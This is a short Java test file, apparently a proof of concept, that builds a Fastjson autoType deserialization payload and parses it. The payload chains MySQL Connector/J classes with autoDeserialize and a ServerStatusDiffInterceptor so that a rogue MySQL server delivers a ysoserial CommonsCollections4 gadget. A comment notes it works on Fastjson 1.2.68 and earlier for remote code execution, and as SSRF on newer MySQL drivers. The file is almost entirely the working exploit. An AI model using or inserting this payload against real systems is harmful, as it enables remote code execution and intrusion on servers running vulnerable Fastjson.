package test;

import com.alibaba.fastjson.JSON;

public class Fastjson15_mysql_4 {
  	//<=1.2.68 and mysql 8.0.19可反序列化 >8.0.19可SSRF
    public static void main(String[] args) throws Exception{
        String payload = "{\r\n"
        		+ "	\"@type\": \"java.lang.AutoCloseable\",\r\n"
        		+ "	\"@type\": \"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\",\r\n"
        		+ "	\"proxy\": {\r\n"
        		+ "		\"@type\": \"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\",\r\n"
        		+ "		\"connectionUrl\": {\r\n"
        		+ "			\"@type\": \"com.mysql.cj.conf.url.ReplicationConnectionUrl\",\r\n"
        		+ "			\"masters\": [{\r\n"
        		+ "				\"host\": \"\"\r\n"
        		+ "			}],\r\n"
        		+ "			\"slaves\": [],\r\n"
        		+ "			\"properties\": {\r\n"
        		+ "				\"host\": \"127.0.0.1\",\r\n"
        		+ "				\"user\": \"yso_CommonsCollections4_calc\",\r\n"
        		+ "				\"dbname\": \"dbname\",\r\n"
        		+ "				\"password\": \"pass\",\r\n"
        		+ "				\"queryInterceptors\": \"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\",\r\n"
        		+ "				\"autoDeserialize\": \"true\"\r\n"
        		+ "			}\r\n"
        		+ "		}\r\n"
        		+ "	}\r\n"
        		+ "}\r\n"
        		+ "";
        System.out.println(payload);
    	JSON.parseObject(payload);
    }
}
